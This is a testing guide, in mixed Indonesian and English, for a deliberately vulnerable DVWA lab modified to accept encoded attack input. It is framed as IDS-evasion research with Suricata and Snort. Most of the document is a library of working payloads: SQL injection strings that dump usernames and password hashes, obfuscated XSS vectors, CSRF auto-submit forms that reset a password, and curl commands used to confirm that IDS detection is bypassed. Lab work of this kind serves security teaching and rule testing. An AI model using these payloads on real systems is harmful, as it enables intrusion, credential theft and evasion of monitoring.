# 🧪 TESTING GUIDE - EVASION PAYLOADS

## ✅ Setup Berhasil!

DVWA sekarang sudah dimodifikasi untuk menerima semua teknik evasion dari `EVASION_PAYLOADS.md`:

### 🔧 Fitur Evasion Support:

1. **Multi-level URL Decoding** (sampai 5 level)
   - Single: `%27` → `'`
   - Double: `%2527` → `%27` → `'`
   - Triple: `%252527` → `%2527` → `%27` → `'`

2. **HTML Entity Decoding**
   - Numeric: `&#39;` → `'`
   - Named: `&lt;script&gt;` → `<script>`
   - Hex: `&#x27;` → `'`

3. **Unicode Escape Handling**
   - `\\u0027` → `'`
   - `\\u003C` → `<`

4. **Whitespace Normalization**
   - Tab, newline, null bytes → space

---

## 🎯 Quick Testing

### 1. SQL Injection Evasion

#### Test 1: URL Encoded UNION
```bash
# Payload
search=1%27%20%55NION%20%53ELECT%20username,password,3,created_at%20FROM%20users%20%23

# What it decodes to:
1' UNION SELECT username,password,3,created_at FROM users #
```

**Cara test:**
1. Login ke DVWA
2. Buka **Pencarian Surat**
3. Paste payload di atas
4. Submit
5. ✅ Harus muncul username & password hash dari database

#### Test 2: Double URL Encoded Quote
```bash
# Payload
search=1%2527%20OR%20%25271%2527=%25271%2527%20%2523

# Decodes to:
1' OR '1'='1' #
```

#### Test 3: Comment Injection
```bash
# Payload (already decoded)
search=1' UNI/**/ON SEL/**/ECT username,password,3,created_at FROM users #

# MySQL ignores /**/ comments, so UNION SELECT works
```

#### Test 4: HTML Entity Encoded
```bash
# Payload
search=1&#39; OR &#39;1&#39;=&#39;1&#39; #

# Decodes to:
1' OR '1'='1' #
```

---

### 2. XSS Stored Evasion

#### Test 1: URL Encoded Script Tag
```bash
# Payload
comment=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

# Decodes to:
<script>alert('XSS')</script>
```

**Cara test:**
1. Buka **Komentar Surat**
2. Paste payload
3. Submit
4. ✅ Alert box muncul

#### Test 2: HTML Entity Encoded
```bash
# Payload
comment=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;

# Decodes to:
<script>alert('XSS')</script>
```

#### Test 3: Double URL Encoded
```bash
# Payload
comment=%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E

# Decodes twice to:
<script>alert('XSS')</script>
```

#### Test 4: SVG with Encoded onload
```bash
# Payload (alternative to script tag)
comment=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E

# Decodes to:
<svg onload=alert('XSS')>
```

#### Test 5: IMG with Encoded onerror
```bash
# Payload
comment=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E

# Decodes to:
<img src=x onerror=alert('XSS')>
```

---

### 3. XSS Reflected Evasion

#### Test 1: URL Encoded in GET Parameter
```
http://localhost:8000/xss_reflected.php?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

#### Test 2: Double Encoded
```
http://localhost:8000/xss_reflected.php?name=%253Cscript%253Ealert%28%2527XSS%2527%29%253C%252Fscript%253E
```

#### Test 3: HTML Entities
```
http://localhost:8000/xss_reflected.php?name=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

#### Test 4: SVG Alternative
```
http://localhost:8000/xss_reflected.php?name=%3Csvg%20onload%3Dalert%281%29%3E
```

---

### 4. CSRF Evasion

#### Test 1: Alternate Field Names
```html
<!-- Attacker page: csrf_attack_evasion.html -->
<form action="http://localhost:8000/csrf.php" method="POST" id="attackForm">
    <input type="hidden" name="password" value="hacked123">
    <input type="hidden" name="password_confirm" value="hacked123">
</form>
<script>document.getElementById('attackForm').submit();</script>
```

**Field names yang diterima:**
- `new_password` atau `password` atau `new_pass` atau `password_new`
- `confirm_password` atau `password_confirm` atau `confirm_pass`

#### Test 2: URL Encoded Values
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="new_password" value="hacked%21%40%23">
    <input type="hidden" name="confirm_password" value="hacked%21%40%23">
</form>
```

---

## 📊 Testing Checklist

### SQL Injection
- [ ] URL encoded keywords (`%55NION`, `%53ELECT`)
- [ ] Double URL encoded (`%2527` for quote)
- [ ] HTML entity encoded (`&#39;` for quote)
- [ ] Comment injection (`UNI/**/ON`)
- [ ] Alternative boolean (`2=2`, `TRUE`)
- [ ] Alternative comment syntax (`#` instead of `--`)
- [ ] Hex values (`0x313d31` = `1=1`)

### XSS Stored
- [ ] URL encoded tags (`%3Cscript%3E`)
- [ ] Double URL encoded
- [ ] HTML entity encoded (`&lt;script&gt;`)
- [ ] Alternative tags (`<svg>`, `<img>`, `<body>`)
- [ ] Alternative events (`onload`, `onerror`, `onclick`)
- [ ] Case variation (`<ScRiPt>`)

### XSS Reflected
- [ ] Same as XSS Stored but via GET parameter
- [ ] Multiple encoding layers
- [ ] Alternative payload methods

### CSRF
- [ ] Alternate field names
- [ ] URL encoded path (`/csrf.php` → `/%63%73%72%66.php`)
- [ ] URL encoded values

---

## 🔍 Verifikasi dengan IDS

### Setup Suricata/Snort3

1. **Install di Kali VM**
```bash
sudo apt update
sudo apt install suricata -y
```

2. **Load Rules**
```bash
# Copy rules dari LAPORAN_IDS_EVASION.md
sudo nano /etc/suricata/rules/dvwa.rules

# Restart Suricata
sudo systemctl restart suricata
```

3. **Monitor Logs**
```bash
# Terminal 1: Watch alerts
sudo tail -f /var/log/suricata/fast.log

# Terminal 2: Test payload
curl "http://192.168.1.100:8000/sqli.php" \
  -d "search=1%27%20%55NION%20%53ELECT%201,2,3,4%20%23"
```

### Expected Results

**Normal Payload (Detected):**
```bash
curl -d "search=1' UNION SELECT 1,2,3,4 #"
# Suricata Alert: [100001] SQLi - UNION SELECT
```

**Evasion Payload (NOT Detected):**
```bash
curl -d "search=1%27%20%55NION%20%53ELECT%201,2,3,4%20%23"
# Suricata: No alert (bypass successful!)
```

---

## 🎓 Payload Library

### SQLi - All Evasion Techniques

```sql
-- 1. Normal (baseline)
1' UNION SELECT username,password,3,created_at FROM users #

-- 2. URL Encoded
1%27%20UNION%20SELECT%20username,password,3,created_at%20FROM%20users%20%23

-- 3. URL Encoded keywords only
1' %55NION %53ELECT username,password,3,created_at FROM users #

-- 4. Double URL Encoded
1%2527%20UNION%20SELECT%20username,password,3,created_at%20FROM%20users%20%2523

-- 5. Mixed Encoding
1' %55NI%4fN %53ELE%43T username,password,3,created_at FROM users #

-- 6. Comment Injection
1' UNI/**/ON SEL/**/ECT username,password,3,created_at FROM users #

-- 7. HTML Entities
1&#39; UNION SELECT username,password,3,created_at FROM users &#35;

-- 8. Whitespace Variation (Tab = %09)
1'%09UNION%09SELECT%09username,password,3,created_at%09FROM%09users%09#

-- 9. Case Obfuscation
1' UnIoN SeLeCt username,password,3,created_at FrOm users #

-- 10. Numeric SQLi (no quotes)
1 OR 1=1 #

-- 11. Alternative Boolean
1' OR 2=2 #
1' OR TRUE #
1' OR 'a'='a' #

-- 12. Alternative Comment
1' OR '1'='1' /* comment */

-- 13. Semicolon Terminator
1' OR '1'='1';
```

### XSS - All Evasion Techniques

```html
<!-- 1. Normal (baseline) -->
<script>alert('XSS')</script>

<!-- 2. URL Encoded -->
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

<!-- 3. Double URL Encoded -->
%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E

<!-- 4. HTML Entities -->
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;

<!-- 5. SVG Tag -->
<svg onload=alert('XSS')>

<!-- 6. IMG Tag -->
<img src=x onerror=alert('XSS')>

<!-- 7. Body Tag -->
<body onload=alert('XSS')>

<!-- 8. iframe Tag -->
<iframe src=javascript:alert('XSS')>

<!-- 9. Case Variation -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- 10. Event Handler Variation -->
<div onclick=alert('XSS')>Click</div>
<input onfocus=alert('XSS') autofocus>
<div onmouseover=alert('XSS')>Hover</div>

<!-- 11. Alternative Functions -->
<script>prompt('XSS')</script>
<script>confirm('XSS')</script>

<!-- 12. Base64 Encoded -->
<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>

<!-- 13. String.fromCharCode -->
<script>String.fromCharCode(97,108,101,114,116)(1)</script>

<!-- 14. JavaScript Protocol -->
<a href="javascript:alert('XSS')">Click</a>

<!-- 15. Object Tag -->
<object data="data:text/html,<script>alert('XSS')</script>">
```

---

## 🛠️ Debugging

### Jika Payload Tidak Bekerja

1. **Check PHP Error Log**
```bash
# Docker
docker logs dvwa_web

# XAMPP
C:\xampp\apache\logs\error.log

# Laragon
d:\laragon\logs\apache_error.log
```

2. **Test Decoding Manual**
```php
<?php
// Test URL decode
$payload = "1%2527%20OR%20%25271%2527=%25271%2527%20%2523";
echo "Original: $payload\n";
echo "Decode 1: " . urldecode($payload) . "\n";
echo "Decode 2: " . urldecode(urldecode($payload)) . "\n";
?>
```

3. **Check Browser Network Tab**
- Buka Developer Tools (F12)
- Tab "Network"
- Submit payload
- Check request payload vs response

4. **Verify Database**
```bash
# Docker
docker exec -it dvwa_db mysql -u dvwa -pdvwa123 dvwa -e "SELECT * FROM comments;"

# XAMPP
# Buka http://localhost/phpmyadmin
# Database: dvwa
# Table: comments
```

---

## 📈 Success Metrics

Jika implementasi berhasil, harusnya:

✅ **SQL Injection:**
- Normal payload: Works
- URL encoded: Works
- Double encoded: Works
- Comment injection: Works
- Alternative boolean: Works

✅ **XSS Stored:**
- Normal `<script>`: Works
- URL encoded: Works
- HTML entities: Works
- Alternative tags: Works

✅ **XSS Reflected:**
- Same as XSS Stored

✅ **CSRF:**
- Normal fields: Works
- Alternate field names: Works
- URL encoded values: Works

---

## 🎯 Next Steps

1. **Test semua payload dari EVASION_PAYLOADS.md**
2. **Monitor dengan Suricata/Snort3**
3. **Document bypass rate** (berapa % lolos deteksi)
4. **Create improved rules** based on findings
5. **Submit findings** to LAPORAN_IDS_EVASION.md

---

**Happy Testing! 🔥**

*Remember: This is for educational purposes only. Never test on production systems without authorization.*
